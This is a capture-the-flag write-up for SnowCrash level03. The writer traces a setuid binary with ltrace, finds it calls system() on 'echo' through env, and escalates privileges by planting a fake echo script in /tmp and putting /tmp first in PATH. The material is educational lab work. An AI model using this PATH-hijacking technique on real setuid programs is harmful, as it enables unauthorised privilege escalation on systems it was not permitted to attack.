```bash
level03@SnowCrash:~$ ll
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile*
```
So we have a file03 binary that has the flag03 rights
of course we try it
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```
Challenge accepted

so we have two ways to find something, first
```bash
strings ./level03
```
which gives us a really long and complicated output
or 
```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                              = 2003
geteuid()                                                                                                              = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                    = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                    = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                 = 0
+++ exited (status 0) +++
```
which is way more bearable
So, we can see a call to the function system, which takes in the env the command echo
WHICH MEANSSSSS, that if we change the path we will get the flag03

```bash
echo '/bin/getflag' > /tmp/echo 
chmod +x /tmp/echo
export PATH="/tmp/":$PATH
./level03
```

ANDDDDDDD good job we have the flag !

